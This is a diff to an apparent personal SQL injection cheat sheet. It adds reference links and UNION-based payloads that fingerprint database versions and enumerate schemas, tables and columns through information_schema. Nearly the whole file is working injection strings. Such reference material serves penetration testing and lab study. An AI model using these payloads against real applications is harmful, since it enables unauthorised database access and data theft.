@@ -1,4 +1,6 @@
-Pentestermonkey SQL injection cheat sheet (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+PortSwigget Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+Pentestermonkey SQL injection cheat sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 
 ## Error
 	'
@@ -29,15 +31,20 @@ Pentestermonkey SQL injection cheat sheet (https://github.com/swisskyrepo/Payloa
 	1' UNION SELECT null,@@version-- -
 	1' UNION SELECT null,version()-- -
 	1' UNION SELECT null,sqlite_version()-- -
+	1' UNION SELECT null,* FROM v$version-- -
 	1' UNION SELECT null,@@database-- -
 	1' UNION SELECT null,database()-- -
+	1' UNION SELECT null,* FROM information_schema.tables-- -
 	1' union select 1,group_concat(schema_name)from information_schema.schemata-- -
 
 ### Tables
+	1' UNION SELECT null,table_name FROM information_schema.tables-- -
 	1' union select 1,group_concat(table_name) from information_schema.tables where table_schema = database()-- -
 	1' union select 1, table_name FROM information_schema.tables-- -
 
 ### Columns
+	1' UNION SELECT null,[column_name] FROM [table_name]-- -
+	1' UNION SELECT null,column_name FROM information_schema.columns where table_name = 'users_owgtcb'-- -
 	1' union select 1,group_concat(column_name) from information_schema.tables where table_schema = database()-- -
 	id=1' union select 1, column_name FROM information_schema.tables-- -
 
